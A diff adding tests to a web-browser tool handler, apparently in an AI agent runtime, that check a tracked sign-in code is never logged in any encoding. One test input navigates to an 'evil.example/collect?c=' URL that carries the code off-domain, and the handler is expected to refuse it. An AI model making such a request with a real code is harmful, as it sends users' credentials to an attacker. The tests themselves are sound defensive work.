@@ -1695,6 +1695,71 @@ describe('web-browser sign-in verification (#2017)', () => {
     expect(page.goto).not.toHaveBeenCalled();
   });
 
+  describe('never logs a tracked code, in any encoding', () => {
+    const FORMS = ['482913', '482 913', '482-913', '482%20913', '482+913', '%34%38%32%39%31%33'];
+
+    /** A pino logger at trace level that keeps every serialized line. */
+    function capturingLogger() {
+      const lines: string[] = [];
+      const log = pino({ level: 'trace' }, { write: (line: string) => { lines.push(line); } });
+      return { log, lines };
+    }
+
+    function expectNoCode(lines: string[]) {
+      expect(lines.length).toBeGreaterThan(0);
+      for (const line of lines) {
+        for (const form of FORMS) expect(line).not.toContain(form);
+        // Also decoded, in case a field was logged in an encoded form we did not list.
+        expect(decodeURIComponent(line.replace(/\+/g, ' '))).not.toMatch(/482[ -]?913/);
+      }
+    }
+
+    function runtimeWithCode() {
+      const v = verification({});
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE);
+      return runtime;
+    }
+
+    it.each(FORMS)('refused off-domain navigate with c=%s logs no code', async (form) => {
+      const { log, lines } = capturingLogger();
+      const { ctx } = verifyCtx('https://login.aircanada.com/mfa', { action: 'navigate', url: `https://evil.example/collect?c=${form}` }, runtimeWithCode());
+      (ctx as unknown as { log: unknown }).log = log;
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result).toEqual({ success: false, error: REFUSAL });
+      expectNoCode(lines);
+    });
+
+    it.each(FORMS)('allowed navigate with c=%s that hits a block logs no code', async (form) => {
+      const { log, lines } = capturingLogger();
+      // A hard-block title drives both the soft-block reload log and the hard-block log.
+      const page = makeMockPage('', vi.fn(), 'https://login.aircanada.com/mfa', { title: 'Access Denied' });
+      const session = new BrowserSession({} as unknown as BrowserContext, page as unknown as Page);
+      const browserService = {
+        getOrCreateSession: vi.fn().mockResolvedValue({ sessionId: 'sess-1', session }),
+        closeSession: vi.fn().mockResolvedValue(undefined),
+      } as unknown as BrowserService;
+      const ctx = {
+        input: { action: 'navigate', url: `https://login.aircanada.com/verify?c=${form}` },
+        log,
+        browserService,
+        verification: runtimeWithCode(),
+      } as unknown as ToolContext;
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result.success).toBe(false);
+      expect(page.goto).toHaveBeenCalledTimes(1);
+      expectNoCode(lines);
+      // The URL is still logged, with the code replaced.
+      const blockLines = lines.filter((l) => l.includes('hard edge block') || l.includes('Soft block suspected'));
+      expect(blockLines).toHaveLength(2);
+      for (const l of blockLines) expect(l).toContain('[sign-in code]');
+    });
+  });
+
   it('allows a tracked value in a navigate url to its own page_domain', async () => {
     const v = verification({});
     const { runtime, tracker } = makeRuntime([v]);
